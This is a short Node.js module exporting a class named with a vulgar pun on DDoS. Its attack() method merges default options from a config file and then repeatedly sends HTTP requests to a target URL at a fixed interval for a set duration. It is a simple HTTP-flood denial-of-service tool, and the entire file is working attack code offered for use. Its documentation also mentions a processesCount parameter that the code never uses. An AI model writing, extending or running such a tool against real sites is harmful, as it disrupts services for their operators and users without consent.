// ---------------------------- Imports. ---------------------------------
const fs      = require('fs'),
      cp      = require('child_process'),
      request = require('request')

// --------------------------- Main class. -------------------------------
class Pizdos {
    // Public.
    /**
     * Starts attack on url using options.
     * @param {string} url 
     * @param {Object} options 
     */
    static attack(url, options) {
        fs.readFile(__dirname + '/../config/standart-options.json',
                    'utf8',
                    (err, data) => {
            if (err) throw err
            
            const o = Object.assign(JSON.parse(data), options)

            this.startAttack(url,
                             o.attackDuration,
                             o.requestsFrequency)
        })
    }

    // Private.
    /**
     * Starts attack on url.
     * @param {string} url 
     * @param {number} processesCount 
     * @param {number} duration 
     * @param {number} frequency 
     */
    static startAttack(url, duration, frequency) {
        console.log('Attack is started.')

        setInterval(() => {
            request(url, (error, r, b) => {
                if (!!error) {
                    console.log('Attack ended with an error.')
                    process.abort()
                }
            })
        }, frequency)

        setTimeout(() => {
            console.log('Attack is complete.')
            process.abort()
        }, duration)
    }
}

// ---------------------------- Exports. ---------------------------------
module.exports = Pizdos